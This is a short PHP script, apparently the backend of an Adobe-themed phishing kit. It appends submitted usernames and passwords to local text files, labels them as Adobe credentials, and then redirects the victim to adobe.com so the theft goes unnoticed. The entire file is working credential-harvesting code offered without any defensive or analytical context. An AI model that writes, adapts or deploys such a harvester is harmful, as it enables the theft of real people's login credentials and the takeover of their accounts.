<?php

file_put_contents("usernames.txt", "Adobe Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Adobe Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://adobe.com');
?>
